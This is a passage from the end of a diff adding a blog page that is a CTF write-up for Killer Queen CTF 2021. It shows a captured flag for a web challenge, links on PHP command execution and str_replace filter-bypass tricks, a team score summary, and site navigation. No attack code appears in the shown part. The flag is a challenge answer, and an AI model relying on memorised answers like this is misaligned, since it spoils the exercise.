+<li>Result: flag: <code>flag&#123;wait_but_i_fixed_it_after_my_last_two_blunders_i_even_filtered_three_times_:(((&#125;</code><br>  <img src="https://i.imgur.com/NWY85w6.jpg"><h2 id="Resources-for-challenge-2"><a href="#Resources-for-challenge-2" class="headerlink" title="Resources for challenge 2"></a>Resources for challenge 2</h2><a target="_blank" rel="noopener" href="https://www.php.net/manual/en/function.shell-exec.php">PHP execute commands</a><br><a target="_blank" rel="noopener" href="https://github.com/m3ssap0/CTF-Writeups/blob/master/35C3%20Junior%20CTF/flags/README.md">str_replace() tricks</a><br><a target="_blank" rel="noopener" href="https://jbz.team/turinctf2017/turinctf">str_replace() tricks 2</a></li>
+</ul>
+</li>
+</ul>
+<h1 id="Result"><a href="#Result" class="headerlink" title="Result"></a>Result</h1><ul>
+<li>I solved two challeges, and all of us solved 9 challenges<br><img src="https://i.imgur.com/k7s83OX.png"></li>
+</ul>
+
+    </article>
+    <!-- license -->
+    
+        <div class="license-wrapper">
+            <p>Author：<a href="https://jeff14994.github.io">atx0mg</a>
+            <p>Link：<a href="https://jeff14994.github.io/2021/10/31/Killer-Queen-CTF-2021/">https://jeff14994.github.io/2021/10/31/Killer-Queen-CTF-2021/</a>
+            <p>Publish date：<a href="https://jeff14994.github.io/2021/10/31/Killer-Queen-CTF-2021/">October 31st 2021, 11:06:56 am</a>
+            <p>Update date：<a href="https://jeff14994.github.io/2021/10/31/Killer-Queen-CTF-2021/">April 10th 2025, 11:37:48 am</a>
+            <p>License：This article is licensed under CC BY-NC 4.0</p>
+        </div>
+    
+    <!-- paginator -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href="/2021/11/06/Dam-CTF-2021/" title="Dam CTF 2021">
+                    <div class="nextTitle">Dam CTF 2021</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2021/10/23/BuckeyeCTF-2021/" title="BuckeyeCTF 2021">
+                    <div class="prevTitle">BuckeyeCTF 2021</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- comment -->
+    
+        <div class="post-comment">
+            <!-- 来必力 City 版安装代码 -->
+
+
+            
+
+            
+
+            
+
+            <!-- utteranc评论 -->
+
+
+            <!-- partial('_partial/comment/changyan') -->
+            <!--PC版-->
+
+
+            
+            
+
+            
+
+        </div>
+    
+    <!-- timeliness note -->
+    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
+    
+    <!-- Mathjax -->
+    
+</main>
+
+                <!-- profile -->
+                
+            </div>
+            <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+        <div class="social">
+            
+    
+        
+            
+                <a href="mailto:jeff14994 [at] gmail.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/jeff14994" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="https://www.facebook.com/jeff.hong.14994" class="iconfont-archer facebook" target="_blank" title=facebook></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="https://www.linkedin.com/in/jeff14994/" class="iconfont-archer linkedin" target="_blank" title=linkedin></a>
+            
+        
+    
+        
+    
+        
+            
+                <a href="https://hackmd.io/@jeff14994" class="iconfont-archer others" target="_blank" title=others></a>
+            
+        
+    
+        
+    
+
+
+        </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- website approve for Chinese user -->
+    
+    <!-- 不蒜子  -->
+    
+        <div class="busuanzi-container">
+            
+             
+                <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+            
+        </div>
+    	
+</footer>
+
+        </div>
+        <!-- toc -->
+        
+            <div class="toc-wrapper toc-wrapper-loding" style=
+
+
+
+
+
+
+
+    top:50vh;
+
+>
+                <div class="toc-catalog">
+                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+                </div>
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Just-Not-My-Type"><span class="toc-number">1.0.1.</span> <span class="toc-text">Just Not My Type</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Resources-for-first-challenge"><span class="toc-number">1.1.</span> <span class="toc-text">Resources for first challenge:</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-1"><span class="toc-number">2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PHat-Pottomed-Girls"><span class="toc-number">2.0.1.</span> <span class="toc-text">PHat Pottomed Girls</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Resources-for-challenge-2"><span class="toc-number">2.1.</span> <span class="toc-text">Resources for challenge 2</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Result"><span class="toc-number">3.</span> <span class="toc-text">Result</span></a></li></ol>
+            </div>
+        
+        <!-- sidebar -->
+        <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+        <div class="sidebar-panel-archives">
+    <!-- 在 ejs 中将 archive 按照时间排序 -->
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 11
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+        
+            
+            
+            <div class="archive-year"> 2022 </div>
+            <ul class="year-list">
+            
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/04</span>
+            <a class="archive-post-title" href="/2022/07/04/AIS3-2022-Pre-exam/">AIS3 2022 Pre-exam</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/11</span>
+            <a class="archive-post-title" href="/2022/03/11/write4-rop/">write4 rop</a>
+        </li>
+    
+        
+            
+            
+                
+                </ul>
+            
+            <div class="archive-year"> 2021 </div>
+            <ul class="year-list">
+            
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/06</span>
+            <a class="archive-post-title" href="/2021/12/06/MetaCTF-2021/">MetaCTF 2021</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/28</span>
+            <a class="archive-post-title" href="/2021/11/28/TFCCTF-2021/">TFCCTF 2021</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/15</span>
+            <a class="archive-post-title" href="/2021/11/15/K3RN3LCTF-2021/">K3RN3LCTF 2021</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/06</span>
+            <a class="archive-post-title" href="/2021/11/06/Dam-CTF-2021/">Dam CTF 2021</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/31</span>
+            <a class="archive-post-title" href="/2021/10/31/Killer-Queen-CTF-2021/">Killer Queen CTF 2021</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/23</span>
+            <a class="archive-post-title" href="/2021/10/23/BuckeyeCTF-2021/">BuckeyeCTF 2021</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/19</span>
+            <a class="archive-post-title" href="/2021/09/19/SunshineCTF-2021/">SunshineCTF 2021</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/13</span>
+            <a class="archive-post-title" href="/2021/09/13/CSAWCTF-2021/">CSAWCTF 2021</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/28</span>
+            <a class="archive-post-title" href="/2021/08/28/FWordCTF-2021/">FWordCTF 2021</a>
+        </li>
+    
+    </div>
+</div>
+
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+        
+            <span class="sidebar-tag-name" data-tags="ctf">
+                <span class="iconfont-archer">&#xe606;</span>
+                ctf
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="AIS3">
+                <span class="iconfont-archer">&#xe606;</span>
+                AIS3
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="forensics">
+                <span class="iconfont-archer">&#xe606;</span>
+                forensics
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="wargame">
+                <span class="iconfont-archer">&#xe606;</span>
+                wargame
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="2022">
+                <span class="iconfont-archer">&#xe606;</span>
+                2022
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="rop">
+                <span class="iconfont-archer">&#xe606;</span>
+                rop
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="ROP Emporium">
+                <span class="iconfont-archer">&#xe606;</span>
+                ROP Emporium
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="pwn">
+                <span class="iconfont-archer">&#xe606;</span>
+                pwn
+            </span>
+        
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+        缺失模块，请参考主题文档进行安装配置：https://github.com/fi3ework/hexo-theme-archer#%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+
+    </div>
+</div>
+
+        <!-- site-meta -->
+        <script>
+    var siteMetaRoot = "/"
+    if (siteMetaRoot === "undefined") {
+        siteMetaRoot = '/'
+    }
+    var siteMeta = {
+        url: "https://jeff14994.github.io",
+        root: siteMetaRoot,
+        author: "atx0mg"
+    }
+</script>
+
+        <!-- import experimental options here -->
+        <!-- Custom Font -->
+
+
+        <!-- main func -->
+        <script src="/scripts/main.js?v=20211217"></script>
+        <!-- dark mode -->
+        <script src="/scripts/dark.js?v=20211217"></script>
+        <!-- fancybox -->
+        <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" defer></script>
+        <!-- algolia -->
+        
+        <!-- busuanzi -->
+        
+            <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+        
+        <!-- CNZZ -->
+        
+        <!-- async load share.js -->
+        
+            <script src="/scripts/share.js?v=20211217" async></script>
+        
+        <!-- mermaid -->
+        
+    </body>
+</html>
